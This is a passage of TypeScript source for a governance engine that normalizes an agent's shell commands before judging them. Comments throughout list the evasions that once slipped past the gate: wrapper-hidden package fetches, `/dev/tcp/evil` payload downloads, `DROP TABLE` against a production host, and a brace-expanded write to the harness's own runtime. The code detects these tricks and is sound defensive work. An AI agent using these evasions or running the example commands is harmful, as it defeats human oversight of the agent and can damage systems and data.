/** The words that follow the command head, with redirections removed. `git push --help 2>&1` is a help request whose
 *  standard error goes somewhere, and `git push --force origin main > --help` is a push whose OUTPUT FILE is called
 *  `--help`: in neither is the text after the operator a word of the command. */
function commandWords(t: ReadonlyArray<{ text: string; quoted: boolean }>): Array<{ text: string; quoted: boolean }> {
  const out: Array<{ text: string; quoted: boolean }> = [];
  for (let i = 0; i < t.length; i++) {
    const x = t[i]!;
    if (!x.quoted && /^(?:\d*|&)(?:>>?|<<?<?|>&|<&|>\||<>)/.test(x.text)) {
      // a bare operator takes the NEXT word as its target; a glued one (`2>/dev/null`, `>&2`) carries it
      if (/^(?:\d*|&)(?:>>?|<<?<?|>&|<&|>\||<>)$/.test(x.text)) i++;
      continue;
    }
    out.push(x);
  }
  return out;
}

/** Where the VERB is among `rest` (the words after the head), or -1 when an option this table cannot place stands
 *  in front of it. */
function verbIndex(head: string, rest: ReadonlyArray<{ text: string; quoted: boolean }>): number {
  const table = GLOBAL_OPTIONS[head];
  for (let i = 0; i < rest.length; i++) {
    const x = rest[i]!;
    if (x.quoted || !x.text.startsWith('-')) return i;
    if (x.text.includes('=') || /^-[A-Za-z]./.test(x.text) && x.text.length > 2 && !x.text.startsWith('--') && table?.value.test(x.text.slice(0, 2))) continue; // complete, or a glued short value
    if (table?.bool.test(x.text)) continue;
    if (table?.value.test(x.text)) {
      i++;
      continue;
    }
    return -1;
  }
  return -1;
}

const HELP_FLAG_RE = /^(--help|-help|--usage|-\?)$/;
/** git flags that take no value, so a help flag after them is not their argument */
const GIT_BOOLEAN_FLAGS =
  /^(-a|--all|-u|--include-untracked|-k|--keep-index|-q|--quiet|-f|--force|-n|--dry-run|-v|--verbose|-p|--patch|--force-with-lease|--no-verify|--tags|--delete|-d|-D|--mirror|--prune|--follow-tags|--atomic)$/;
/** clients whose `--help`, `--version` and `-V` print and exit whatever else is on the line */
const PROBING_DB_CLIENTS = /^(psql|pg_dump|pg_restore|mysql|mariadb|mysqldump|mongosh|mongo|redis-cli|valkey-cli|clickhouse-client|influx|sqlite3|cqlsh)$/;

function helpProbeHead(segment: string): string | null {
  const t = tokenizeMarked(segment);
  const words = t.map((x) => x.text);
  const hi = commandHeadIndex(words);
  const head = (words[hi] ?? '').replace(/^.*\//, '');
  // A SHELL'S SYNTAX CHECK PARSES AND EXECUTES NOTHING. `bash -n -c "rm -rf /"` reads the body and stops; it is
  // how an author verifies a script before trusting it, and reading the body as a command made the verification
  // carry the body's verdict (exit review 10). `-n` must be an OPTION of the shell itself - before `-c` and before
  // any operand - or it belongs to the script. An option that takes a value (`--rcfile F`, `-o NAME`, `-O NAME`)
  // takes the next word with it: `bash --rcfile -n script.sh` sources a file called `-n`.
  if (/^(ba|z|da|k)?sh$/.test(head)) {
    const rest0 = commandWords(t.slice(hi + 1));
    for (let i = 0; i < rest0.length; i++) {
      const x = rest0[i]!;
      if (x.quoted || !x.text.startsWith('-') || x.text === '--') break;
      if (x.text === '--noexec' || /^-[a-zA-Z]*n[a-zA-Z]*$/.test(x.text)) return head;
      if (/^(--rcfile|--init-file|-o|\+o|-O|\+O)$/.test(x.text)) i++;
    }
    return null;
  }
  const isDb = PROBING_DB_CLIENTS.test(head);
  if (!HELP_FIRST_CLIS.test(head) && !isDb) return null;
  const rest = commandWords(t.slice(hi + 1));
  if (rest.length === 0) return null;
  const bare = (x: { text: string; quoted: boolean }) => !x.quoted && !x.text.startsWith('-');
  const flagOf = (x: { text: string; quoted: boolean }): boolean =>
    !x.quoted &&
    (HELP_FLAG_RE.test(x.text) ||
      (head === 'git' && x.text === '-h') ||
      // a version request is a probe too, but ONLY as the last word: `helm upgrade --version 1.4.2` pins a chart
      (isDb ? /^(--version|-V)$/.test(x.text) : /^(--version|-version)$/.test(x.text)));
  // (a) the flag DIRECTLY after the head asks the tool itself for its manual, whatever follows it
  if (flagOf(rest[0]!) && !/^(--version|-version|-V)$/.test(rest[0]!.text)) return head;
  if (rest.some((x) => !x.quoted && x.text === '--')) return null;
  const last = rest[rest.length - 1]!;
  const isFlag = flagOf(last);
  if (isFlag) {
    const prev = rest[rest.length - 2];
    // ...a flag known to take NO value may stand in front of it: `git stash --all --help` asks for the manual
    if (
      prev !== undefined &&
      (prev.quoted || (prev.text.startsWith('-') && !(head === 'git' && GIT_BOOLEAN_FLAGS.test(prev.text))))
    )
      return null;
    if (isDb) {
      // redis-cli reads its options FIRST and hands everything after the first bare word to the server as the
      // COMMAND'S arguments: `SET foo --help` stores the string `--help`
      if (/^(redis-cli|valkey-cli)$/.test(head)) {
        const VALUE = /^(-h|-p|-a|-n|-u|-s|-r|-i|-d|-D|--user|--pass|--sni|--cacert|--cacertdir|--cert|--key)$/;
        for (let i = 0; i < rest.length - 1; i++) {
          const x = rest[i]!;
          if (!x.quoted && x.text.startsWith('-')) {
            if (VALUE.test(x.text)) i++;
            continue;
          }
          return null;
        }
      }
      return head;
    }
    // the verb must be findable: an option this table cannot place in front of it leaves the position unknown
    const vi = verbIndex(head, rest);
    if (vi < 0 && rest.length > 1) return null;
    const verb = vi >= 0 && vi < rest.length - 1 ? rest[vi]!.text : undefined;
    if (/^(docker|podman|nerdctl|kubectl|oc|helm)$/.test(head)) {
      // the VERB is the first bare word, or the one after a management group: `docker container run` carries its
      // arguments to a container, `docker context create` and `docker volume create` carry nothing anywhere
      const barePath = rest.slice(Math.max(vi, 0), -1).filter(bare).map((x) => x.text);
      const v2 = /^(container|compose|service|stack|image|builder|buildx)$/.test(barePath[0] ?? '') ? barePath[1] : barePath[0];
      // ...and it carries them only if there IS something to carry: `docker run --help` and `docker service create
      // --help` have no operand between the verb and the flag, so nothing is handed to a container
      const operands = barePath.length - (/^(container|compose|service|stack|image|builder|buildx)$/.test(barePath[0] ?? '') ? 2 : 1);
      if ((ARGV_CARRYING_VERBS.test(v2 ?? '') || ARGV_CARRYING_VERBS.test(barePath[0] ?? '')) && operands > 0) return null;
    }
    // git verbs that RUN a command they were given: `git bisect run ./x --help` runs ./x
    if (head === 'git' && /^(bisect|submodule|filter-branch|rebase|difftool|mergetool|daemon|worktree|stash|instaweb)$/.test(verb ?? '')) {
      const after = rest.slice(vi + 1, -1).filter(bare).map((x) => x.text);
      if (verb === 'bisect' && after.includes('run')) return null;
      if (verb === 'submodule' && after.includes('foreach')) return null;
    }
    return head;
  }
  // (c) `help` as the LAST word is a pseudo-command of the tools that document it there
  const l = last;
  if (
    !l.quoted &&
    l.text === 'help' &&
    rest.length > 1 &&
    /^(aws|gcloud|az|terraform|tofu|pulumi|docker|podman|nerdctl|git|gh|glab)$/.test(head) &&
    rest.slice(0, -1).every((x) => bare(x))
  )
    return head;
  return null;
}

/** What the segment normalizes to. A HELP PROBE normalizes to a marker naming the tool, so nothing about the verb
 *  it was asked about reaches a matcher; everything else the global options produced (`git config …` for a `-c`,
 *  env-injection and identity markers) is KEPT, because a probe does not launder those. The question is asked of
 *  EACH normalized command, not of the segment as written: `flock l git push --help` carries the probe behind an
 *  operand the raw head cannot see. */
export function normalizeSegment(segment: string): string[] {
  const out = normalizeSegmentInner(segment);
  // THE QUESTION IS ASKED OF THE SEGMENT AS WRITTEN. The normalized commands have lost their quoting, and quoting is
  // what says that `'note -a --help'` is one word and a message, not a flag; a wrapper that carries an OPERAND
  // (`flock l git push --help`) is skipped by commandHeadIndex instead.
  const probe = helpProbeHead(segment);
  if (probe === null) return out;
  return [
    ...out.filter((n) => n.startsWith(MARK) || /^git (config|alias-override) /.test(n)),
    `${MARK}help-probe ${probe}`,
  ];
}

/** words joined back into a command line; an EMPTY word stays as `''`, because `git config core.hooksPath ''` is a write
 *  and `git config core.hooksPath` is a read (exit review 10) */
function joinWords(words: readonly string[]): string {
  return words.map((w) => (w === '' ? "''" : w)).join(' ');
}

function normalizeSegmentInner(segment: string): string[] {
  let s = segment.trim();
  // `npx --package=<spec> -c "<benign>"` FETCHES and runs that package; the command after `-c` is a decoy, and
  // every layer below treats `npx` as transparent and `-c` as a carrier, so the acquisition vanished entirely.
  // A runner carrying `--package`/`-p` is NOT transparent: the head survives so the vocabulary can classify it.
  // ... and only when the flag is NPX'S OWN, i.e. before the first non-flag token. In `npx tsc -p .` the `-p`
  // is tsc's project flag, and treating it as npx's made every ordinary `npx tsc` opaque.
  // `npm exec` is `npx` and `bun x` is `bunx` — npm-exec(1) documents them as the SAME command. Stripping the
  // two-word spelling as a transparent pair sent it down a different path from the one-word spelling, so the npx
  // ACQUISITION guard below (a runner carrying its own `--package` fetches) never saw it (exit review 4).
  const WRAP = String.raw`(?:(?:[A-Za-z_][A-Za-z0-9_]*=(?:'[^']*'|"[^"]*"|\S*)|env|command|nohup|setsid|stdbuf|nice(?:\s+-n\s+\S+)?|ionice|timeout(?:\s+\S+)?|caffeinate|chronic|unbuffer|time|builtin|--)\s+)*`;
  // the two-word spellings are the SAME command as the one-word ones, and the rewrite must find them behind a
  // wrapper too — `env npm exec tsc` reached command.unknown while `npx tsc` was an ordinary build
  s = s.replace(new RegExp(`^(${WRAP})npm\\s+(?:exec|x)\\s+`), '$1npx ').replace(new RegExp(`^(${WRAP})bun\\s+x\\s+`), '$1bunx ');
  // THE ACQUISITION GUARD MUST SEE THE HEAD WHEREVER THE HEAD IS. It tested only the RAW head, so one transparent
  // wrapper hid it: `env npx --package=evil-thing -c "tsc --version"` fetched and ran an arbitrary package while
  // the kernel classified the decoy `tsc --version` as an ordinary build (exit review 7). The same shape as the
  // environment-prefix defect — a guard anchored at position 0 in a string the normalizer is about to rewrite.
  const acq = new RegExp(`^${WRAP}(npx|bunx)\\s`).exec(s);
  if (acq) {
    const t = tokenize(s.slice(s.indexOf(acq[1]!)));
    let k = 1;
    while (k < t.length && t[k]!.startsWith('-')) {
      if (/^(--package|-p)(=|$)/.test(t[k]!)) return [s];
      if (t[k] === '--package' || t[k] === '-p' || t[k] === '-c' || t[k] === '--call') k++;
      k++;
    }
  }
  const extra: string[] = [];
  // `gawk -E FILE` TAKES ITS PROGRAM FROM A FILE. Every matcher is compiled case-insensitively, so a rule there
  // cannot tell `-E` from the extremely ordinary `-e`; this reader sees the case and can (exit review 8).
  {
    const t0 = tokenize(s);
    const h0 = (t0[0] ?? '').replace(/^.*\//, '');
    if (/^(awk|gawk|mawk|nawk)$/.test(h0) && t0.some((t, i) => t === '-E' && t0[i + 1] !== undefined))
      extra.push(`${MARK}awk-program-file`);
  }
  // A REDIRECTION TO `/dev/tcp` OR `/dev/udp` IS A NETWORK CONNECTION, and it needs no network binary. Both
  // directions matter: `> /dev/tcp/h/p` sends whatever the command produces, and `< /dev/tcp/h/p` makes the
  // remote side the command's INPUT — `cat 0< /dev/tcp/evil/80 > payload.sh` fetches a file EGO never read.
  for (const nm of s.matchAll(/\/dev\/(tcp|udp)\/([^/\s'"]+)\/([^/\s'"]+)/g))
    extra.push(`${MARK}net-redirect ${nm[1]} ${nm[2]} ${nm[3]}`);
  // Assignments that SELECT THE TARGET of a database or Kubernetes client are not noise: stripping them made
  // `PGHOST=prod-db psql -c "DROP TABLE users"` read as the local socket (round 14). They are re-attached below so
  // the target resolver sees them, and are judged nowhere else.
  const targetEnv: string[] = [];
  // leading VAR=value assignments: stripped, except the ones that change what runs (surfaced as `env-inject VAR`)
  const stripAssignments = (): boolean => {
    let any = false;
    for (;;) {
      const m = /^([A-Za-z_][A-Za-z0-9_]*)=(?:'[^']*'|"[^"]*"|\S*)\s+/.exec(s);
      if (!m) return any;
      // `IFS= read -r line` is the idiom of every line loop: the assignment scopes to the `read` builtin alone, and
      // an IFS that is only ever read by `read` re-points nothing (exit review 10)
      const ifsForRead = m[1] === 'IFS' && /^read\b/.test(s.slice(m[0].length));
      if (ENV_INJECT_RE.test(m[1]!) && envInjects(m[1]!, m[0]!) && !ifsForRead) extra.push(`${MARK}env-inject ${m[1]}`);
      if (TARGET_ENV_RE.test(m[1]!)) targetEnv.push(m[0].trim());
      s = s.slice(m[0].length);
      any = true;
    }
  };
  stripAssignments();
  // `exec -a NAME prog …` runs `prog` under the name NAME: strip the alias so the real head is classified
  s = s.replace(EXEC_ARGV0_RE, '');
  // ...and behind a wrapper too: `command exec -a cat ./deploy.sh` forges argv[0] just the same (exit review 8)
  s = s.replace(new RegExp(`^(${WRAP})exec\\s+(?:-[a-zA-Z]+\\s+)*-a\\s+\\S+\\s+`), '$1');
  // shell prefix keywords (`if git push`, `do npm test`, `then rm -rf x`) are normalization, not a safety
  // judgement: stripping them in the analyzer gives every producer AND the top level the same treatment.
  //
  // EACH REMOVAL EXPOSES A NEW HEAD, so this alternates with the assignment strip instead of running once after
  // it. `if DOCKER_CONTEXT=production docker exec …` had its assignment looked for while the head was still `if`,
  // so the engine was never re-attached and no matcher could match a segment that began with an assignment —
  // a shell on a production daemon at ASK (exit review 6, generated cross-product).
  for (;;) {
    const m = /^(\S+)\s+/.exec(s);
    if (m && PREFIX_KEYWORDS.has(m[1]!)) {
      s = s.slice(m[0].length).trim();
      continue;
    }
    if (!stripAssignments()) break;
  }
  // `dlx` MEANS DOWNLOAD AND EXECUTE. pnpm and yarn always fetch the package from the registry, so the code that
  // runs was never in the workspace and EGO never read a byte of it — stripping the runner made `pnpm dlx <x>`
  // exactly as authorised as `<x>` itself, and an inner command that is ALLOW on its own reached ALLOW through a
  // registry fetch (exit review 4). The acquisition is surfaced AND the inner command is still analysed, because
  // both are true. `pnpm exec`/`yarn exec` run a locally installed binary and stay transparent; `npx`, `npm exec`
  // and `bun x` PREFER a local binary, and gating them would gate `npx tsc`, which the npx `--package` guard
  // already decided against.
  const dlx = /^(pnpm|yarn)\s+dlx\s+([\s\S]+)$/.exec(s);
  if (dlx) return [...extra, `${MARK}registry-fetch ${dlx[1]} dlx`, ...splitShellSegments(dlx[2]!).flatMap(normalizeSegment)];
  // two-word runners, stripped before wrapper handling so `pnpm exec vitest run` is `vitest run` everywhere
  for (;;) {
    const pair = WRAPPER_PAIRS.find((p) => new RegExp(`^${p[0]}\\s+${p[1]}\\s+`).test(s));
    if (!pair) break;
    s = s.replace(new RegExp(`^${pair[0]}\\s+${pair[1]}\\s+`), '');
  }
  const tokens = tokenize(s);
  if (tokens.length === 0) return extra;
  // `command -v NAME` / `-V NAME` LOOKS THE NAME UP and prints where it is; it does not run it. Stripping
  // `command` as a transparent wrapper classified the idiom every script uses to test whether a tool exists as
  // RUNNING that tool, so `command -v node` asked (exit review 4).
  if (tokens[0] === 'command' && /^-[vV]$/.test(tokens[1] ?? '')) return [...extra, s];
  // ...and behind a wrapper too: `timeout 5 command -v node` is the same lookup, and it was classified as RUNNING
  // node (exit review 7)
  {
    const cv = new RegExp(`^${WRAP}command\\s+-[vV]\\s`).exec(s);
    if (cv) return [...extra, s.slice(cv[0].length - 'command -v '.length)];
  }
  let idx = 0;
  for (;;) {
    const t = tokens[idx];
    if (t === undefined) break;
    if (WRAPPERS.has(t) || t === 'timeout') {
      idx++;
      const valueOpt = WRAPPER_VALUE_OPTS[t];
      const positional = WRAPPER_POSITIONALS[t];
      while (idx < tokens.length) {
        const tok = tokens[idx]!;
        if (tok === '--') {
          idx++;
          // after `env --` assignments may still follow: they are judged, then the command starts
          if (t === 'env')
            while (idx < tokens.length && /^[A-Za-z_][A-Za-z0-9_]*=/.test(tokens[idx]!)) {
              const name = tokens[idx]!.slice(0, tokens[idx]!.indexOf('='));
              // ...through `env --` too: a value that cannot name a program does not change what runs
              if (ENV_INJECT_RE.test(name) && envInjects(name, tokens[idx]!)) extra.push(`${MARK}env-inject ${name}`);
              if (TARGET_ENV_RE.test(name)) targetEnv.push(tokens[idx]!);
              idx++;
            }
          break;
        }
        if (t === 'env' && /^[A-Za-z_][A-Za-z0-9_]*=/.test(tok)) {
          // assignments passed through `env` are judged exactly like leading assignments — INCLUDING the ones that
          // select the target, which this branch used to drop (round 15)
          const name = tok.slice(0, tok.indexOf('='));
          // ...and through `env NAME=value` as well, by the same test as a leading assignment
          if (ENV_INJECT_RE.test(name) && envInjects(name, tok)) extra.push(`${MARK}env-inject ${name}`);
          if (TARGET_ENV_RE.test(name)) targetEnv.push(tok);
          idx++;
          continue;
        }
        // `env -S '<command>'` / `--split-string=<command>` re-splits its argument into a command line and runs it,
        // exactly like `bash -c`: the whole string is the command, not an opaque option value
        const splitCluster = t === 'env' ? /^-[0-9A-Za-z]*S/.exec(tok) : null;
        const splitLong = t === 'env' && tok.startsWith('--s') && 'split-string'.startsWith(tok.slice(2).split('=')[0]!);
        if (t === 'env' && (splitCluster !== null || splitLong)) {
          // `-S` in a cluster (`-iS`, `-vS`), glued (`-S'cmd'`), or an abbreviation of --split-string (`--spl`)
          let value: string;
          let used = 1;
          if (splitLong) {
            if (tok.includes('=')) value = tok.slice(tok.indexOf('=') + 1);
            else {
              value = tokens[idx + 1] ?? '';
              used = 2;
            }
          } else {
            const glued = tok.slice(splitCluster![0].length);
            if (glued) value = glued;
            else {
              value = tokens[idx + 1] ?? '';
              used = 2;
            }
          }
          // the split value is env's OWN argv: leading -u/-C/-i/-0 options and VAR=val assignments precede the command,
          // so re-parse it through the env wrapper again rather than treating its first token as the command head.
          // ...AND ENV APPENDS ITS OWN REMAINING ARGUMENTS to what the string split into: `env -S 'tee' FILE` writes FILE,
          // `env -S 'psql' -h prod-db -c 'DROP TABLE users'` connects there (exit review 10)
          const rest = tokens.slice(idx + used);
          return [...extra, ...splitShellSegments('env ' + value + (rest.length ? ' ' + requote(rest) : '')).flatMap(normalizeSegment)];
        }
        if (tok.startsWith('-')) {
          idx++;
          if (valueOpt && valueOpt.test(tok) && !tok.includes('=')) idx++;
          continue;
        }
        if (positional && positional.test(tok)) {
          idx++;
          continue;
        }
        break;
      }
      // `watch`'s argument - and `sem`'s, and a sandbox's default-shell one - is a SHELL STRING, run by `sh -c`: what
      // follows the first `;` or `&&` in `watch 'git status; git push origin main'` is a command of its own, and
      // reading the string as one command by its first word judged `git status` and nothing else (exit review 10)
      if ((t === 'watch' || t === 'sem') && idx < tokens.length && !tokens.some((x) => x === '-x' || x === '--exec')) {
        const shellString = tokens.slice(idx).join(' ');
        if (/[;&|<>$`(]|\n/.test(shellString)) return [...extra, ...splitShellSegments(shellString).flatMap(normalizeSegment)];
      }
      continue;
    }
    if (WRAPPERS_WITH_OPERAND.has(t)) {
      // flock [opts] <file> cmd | flock [opts] <file> -c 'cmd', su [-] user -c cmd, su --command='cmd' user,
      // runuser -u user -- cmd
      const body = operandWrapperBody(tokens, idx);
      if (body !== null)
        return [...extra, ...splitShellSegments(body).flatMap(normalizeSegment), tokens.slice(idx).join(' ')];
      idx++;
      let sawSeparator = false;
      let userGiven = false;
      while (idx < tokens.length && tokens[idx]!.startsWith('-')) {
        const opt = tokens[idx]!;
        idx++;
        if (opt === '--') {
          sawSeparator = true;
          break;
        }
        if (/^(-u|--user)$/.test(opt)) {
          userGiven = true;
          idx++;
        } else if (/^(-w|--timeout|-E|--conflict-exit-code|-g|--group|-s|--shell)$/.test(opt)) idx++;
        else if (/^--user=/.test(opt)) userGiven = true;
      }
      // the lock file / user operand is only positional when it was not already given as an option and no `--`
      // separator has started the command line (round 13: `runuser -u root -- cp …` ate `cp` as the user name)
      if (
        !sawSeparator &&
        !userGiven &&
        (t === 'flock' ||
          t === 'su' ||
          (t === 'runuser' && tokens[idx] !== undefined && !tokens[idx]!.startsWith('-')))
      )
        idx++;
      continue;
    }
    break;
  }
  let rest = tokens.slice(idx);
  if (rest.length === 0) return extra;
  let head = rest[0]!;
  // an absolute path to a well-known tool (`/usr/bin/git`, `/opt/homebrew/bin/gh`) matches like the bare name;
  // relative paths (`./scripts/x.sh`, `./node_modules/.bin/gh`) are kept for effect analysis
  if (
    head.startsWith('/') &&
    /\/(git|gh|glab|kubectl|oc|helm|docker|podman|npm|npx|pnpm|yarn|bun|node|python3?|curl|wget|ssh|scp|rsync|sudo|claude|codex|terraform|aws|gcloud|az|vault|argocd|flux)$/.test(
      head,
    )
  ) {
    head = head.slice(head.lastIndexOf('/') + 1);
    rest = [head, ...rest.slice(1)];
  }
  // git long options may be abbreviated: expand them before any matcher or flag test looks at them
  if (head === 'git') {
    rest = expandGitAbbreviations(rest);
    // `-B` (checkout/switch) and `-M`/`-C` (branch) FORCE a ref to move, destroying commits, while `-b`/`-c`/`-m`
    // merely create or rename. Matchers are compiled case-insensitively, so the distinction cannot be expressed
    // there: it is decided here, case-sensitively, and surfaced as a marker the matcher can name (round 15).
    // ...AND THE VERB IS FOUND PAST GIT'S GLOBAL OPTIONS. `git --no-pager branch -M feature keep` puts
    // `--no-pager` at position 1, so the verb read as an option and the marker was never emitted — the force
    // rename went unmatched while the identical command without the global option was caught (exit review 10).
    // `-c KEY=VALUE`, `-C DIR`, `--git-dir=…` and their neighbours all sit here.
    let verbAtIdx = 1;
    while (verbAtIdx < rest.length && rest[verbAtIdx]!.startsWith('-')) {
      const o = rest[verbAtIdx]!;
      verbAtIdx += /^(-c|-C|--git-dir|--work-tree|--namespace|--exec-path|--config-env)$/.test(o) ? 2 : 1;
    }
    const verb = rest[verbAtIdx] ?? '';
    // checkout forces with -B, switch with -C, branch with -M (move) or -C (copy) — each the uppercase twin of a
    // harmless lowercase create/rename
    const forceLetters: Record<string, string> = { checkout: 'B', switch: 'C', branch: 'MC' };
    const letters = forceLetters[verb];
    const forced =
      letters !== undefined &&
      rest.some((t) => new RegExp(`^-[a-zA-Z]*[${letters}][a-zA-Z]*$`).test(t));
    if (forced) rest = [...rest, `${MARK}force-ref-reset`];
  }
  if (targetEnv.length && TARGET_ENV_HEADS.has(head)) rest = [...rest, ...targetEnv];
  const stripped = stripToolGlobalOptions(head, rest);
  rest = stripped.rest;
  extra.push(...stripped.extra);
  // A CARRIER'S INNER SHELL RUNS ITS OWN EXPANSION PASS. `sh -c "echo x > .harnes{s..s}/runtime/pin.json"`
  // keeps the braces QUOTED at the outer level — where a real shell does not expand them either — and the inner
  // shell then expands them for real. The segment-level expansion therefore cannot see them, and the write to
  // EGO's own runtime reached ASK through every carrier there is (found by the cross-product, exit review 9).
  // The normalizer's output IS the command as the inner shell sees it, so it is expanded here, once, for all of
  // them; a segment with no brace returns unchanged.
  return [...extra, ...normalizeTail(rest)].map((n) => expandBraces(n));
}

/** git accepts any UNAMBIGUOUS abbreviation of a long option, so `--no-verif`, `--forc`, `--amen` and `--de` all work.
 *  Every governance-relevant option is expanded to its canonical spelling before matching; accepting an abbreviation
 *  that git would reject as ambiguous is fail-closed, never fail-open. */
const GIT_LONG_OPTS = [
  '--no-verify', '--force', '--force-with-lease', '--delete', '--amend', '--upload-pack', '--receive-pack',
  '--exec', '--template', '--discard-changes', '--prune', '--mirror', '--tags', '--all', '--hard', '--no-edit',
  '--set-upstream', '--unset-upstream', '--move', '--copy', '--config-env', '--global', '--system', '--unset',
];
function expandGitAbbreviations(tokens: string[]): string[] {
  return tokens.map((t) => {
    const m = /^(--[a-z][a-z-]*)(=.*)?$/s.exec(t);
    if (!m) return t;
    const [, name, value = ''] = m;
    if (GIT_LONG_OPTS.includes(name!) || GIT_COMPLETE_LONG.has(name!)) return t;
    const hits = GIT_LONG_OPTS.filter((o) => o.startsWith(name!));
    // `--de` prefixes both --delete and --discard-changes: expanding to the FIRST governed match keeps the deny,
    // which is the safe direction. git itself would refuse the ambiguity, so nothing legitimate is lost.
    return hits.length ? hits[0]! + value : t;
  });
}

/** Rejoins argv tokens into a command string, re-quoting any token that carries whitespace or a shell operator, so a
 *  carried `sh -c "git push"` keeps its body as one token when the payload is re-tokenized. */
function requote(tokens: string[]): string {
  return tokens.map((t) => (t === '' ? "''" : /[\s;&|<>$`"']/.test(t) ? `'${t.replace(/'/g, `'\\''`)}'` : t)).join(' ');
}

/** A command line with its REDIRECTIONS taken out. `cp x control-plane/permissions/matchers.md 2>&1` has three operands
 *  and one redirection, and a reader that took the last WORD as the destination saw `2>&1` and never the file
 *  (exit review 10, cross-product: the merged-redirect transformation, against a class that used `cp`). The targets
 *  of the redirections themselves are read by redirectionTargets. */
function withoutRedirections(text: string): string {
  const words = commandWords(tokenizeMarked(text)).map((x) => x.text);
  return requote(words);
}

/** `find … -exec CMD {} \;` / `-execdir` / `-ok` / `-okdir` / `fd -x|--exec CMD` / `-delete`: the payload runs, so it is classified. */
function findPayloads(rest: string[]): string[] {
  const out: string[] = [];
  const head = rest[0];
  if (head === 'find' || head === 'gfind') {
    const searchRoot = rest.slice(1).find((t) => !t.startsWith('-')) ?? '.';
    for (let i = 1; i < rest.length; i++) {
      const t = rest[i]!;
      if (t === '-exec' || t === '-execdir' || t === '-ok' || t === '-okdir') {
        const cmd: string[] = [];
        let j = i + 1;
        while (j < rest.length && rest[j] !== ';' && rest[j] !== '\\;' && rest[j] !== '+')
          cmd.push(rest[j++]!);
        // `{}` stands for a match under the search root: the root is the most specific path the kernel can see.
        // `-execdir` and `-okdir` run the payload IN THE DIRECTORY OF EACH MATCH, which is somewhere inside the search
        // root: its relative operands are judged under the root, which is governed wherever any of its files is
        const inMatchDir = t === '-execdir' || t === '-okdir';
        if (cmd.length)
          out.push(
            requote(
              cmd.map((c, k) =>
                c === '{}' ? searchRoot
                : inMatchDir && k > 0 && !c.startsWith('-') && !c.startsWith('/') && !c.includes('=') ? `${searchRoot.replace(/\/$/, '')}/${c}`
                : c,
              ),
            ),
          );
        i = j;
      } else if (t === '-delete') {
        // predicates narrow a deletion: only a search root that is itself a protected tree is judged as deleting it
        out.push(
          /(^|\/)\.(harness|git|husky|claude|codex|ssh|aws|kube|gnupg)(\/|$)/i.test(searchRoot)
            ? `rm -r ${searchRoot}`
            : `rm -r ${searchRoot.replace(/\/$/, '')}/FIND_MATCH`,
        );
      }
    }
  }
  if (head === 'fd' || head === 'fdfind') {
    // `fd [OPTIONS] [pattern] [path]`: the search root is the second bare operand, else the working directory
    const execAt = rest.findIndex((t) => t === '-x' || t === '--exec' || t === '-X' || t === '--exec-batch');
    const operands = rest.slice(1, execAt < 0 ? rest.length : execAt).filter((t) => !t.startsWith('-'));
    const searchRoot = operands[1] ?? '.';
    for (let i = 1; i < rest.length; i++) {
      const t = rest[i]!;
      if (t === '-x' || t === '--exec' || t === '-X' || t === '--exec-batch') {
        const cmd: string[] = [];
        let j = i + 1;
        while (j < rest.length && rest[j] !== ';' && rest[j] !== '\\;') cmd.push(rest[j++]!);
        // `{}` / `{/}` / `{.}` stand for a match under the search root, exactly as find's `{}` does: substitute the
        // root rather than dropping the placeholder, or `fd -x rm -rf {}` reads as a bare `rm -rf` (round 13)
        if (cmd.length) out.push(requote(cmd.map((c) => (/^\{.*\}$/.test(c) ? searchRoot : c))));
        i = j;
      }
    }
  }
  if (head === 'parallel' || head === 'xargs') {
    const after: string[] = [];
    let replstr: string | null = null;
    for (let i = 1; i < rest.length; i++) {
      const t = rest[i]!;
      if (after.length === 0 && t.startsWith('-')) {
        // -I R / -J R / --replace=R: R is a placeholder, not the command; other value options consume their value
        const m = /^(-I|-J|--replace|-i)(?:=?(.+))?$/.exec(t);
        if (m) {
          if (m[2]) replstr = m[2];
          else if (m[1] === '-I' || m[1] === '-J') replstr = rest[++i] ?? null;
          else replstr = '{}';
          continue;
        }
        if (/^(-n|-L|-P|-s|-E|-d|-a|--max-args|--max-procs|--delimiter|--arg-file|-j|--jobs)$/.test(t)) i++;
        continue;
      }
      after.push(t);
    }
    const payload = after.filter((t) => t !== replstr && !/^\{.*\}$/.test(t) && t !== ':::');
    if (payload.length) out.push(requote(payload));
  }
  return out;
}

/** A system interpreter named by its absolute path is that interpreter. `/bin/sh -c 'git push origin main'` was
 *  read as a SCRIPT PATH to open, found unreadable, and asked — while the same command spelled `sh -c` is denied
 *  (exit review 4). Only the system directories count: a repository-local `./bin/sh` is a file EGO can read, and
 *  reading it is strictly better than assuming what it is. */
const SYSTEM_INTERPRETER_RE = /^\/(?:bin|sbin|usr\/bin|usr\/sbin|usr\/local\/bin)\/((?:ba|z|da|k|a)?sh|fish)$/;

function normalizeTail(rest: string[]): string[] {
  let head = rest[0]!;
  const systemInterpreter = SYSTEM_INTERPRETER_RE.exec(head);
  if (systemInterpreter) {
    head = systemInterpreter[1]!;
    rest = [head, ...rest.slice(1)];
  }
  if (head === 'bash' || head === 'sh' || head === 'zsh' || head === 'dash' || head === 'ksh' || head === 'fish') {
    // -c, or a combined short-flag cluster CONTAINING c (`-euc`, `-ec`, `-lc`, `-xc`, `-cx`) — `-c` takes the next
    // operand as the command string wherever it sits in the cluster. A `--` may separate it from that operand.
    // It must come BEFORE the first operand: in `bash run.sh -c ls` the `-c` is the SCRIPT'S argument, and reading
    // it as the shell's hijacked the interpreter so run.sh was never resolved at all (exit review 4).
    // AN OPTION'S VALUE IS NOT AN OPERAND. `bash -o pipefail -c CMD` has `pipefail` where the scan looked for the
    // script, so the `-c` after it was read as the SCRIPT'S argument and the inline program was never analysed
    // (exit review 6).
    const operandAt: number[] = [];
    for (let i = 1; i < rest.length; i++) {
      if (STDIN_HEAD_VALUE_FLAG_RE.test(rest[i]!)) {
        i++;
        continue;
      }
      if (!rest[i]!.startsWith('-')) operandAt.push(i);
    }
    const firstOperand = operandAt.length ? operandAt[0]! : -1;
    const cIdx = rest.findIndex((t) => t === '-c' || /^-[a-z]*c[a-z]*$/i.test(t));
    if (cIdx >= 0 && (firstOperand < 0 || cIdx < firstOperand)) {
      const inner = rest[cIdx + 1] === '--' ? rest[cIdx + 2] : rest[cIdx + 1];
      if (inner) return [`${head} -c`, ...splitShellSegments(inner).flatMap(normalizeSegment)];
    }
    // `sh <<< "git push origin main"` feeds the interpreter a script on stdin: the herestring IS the command, and
    // the same text after `-c` is denied (exit review 4).
    const hereIdx = rest.findIndex((t) => t === '<<<');
    if (hereIdx >= 0 && rest[hereIdx + 1])
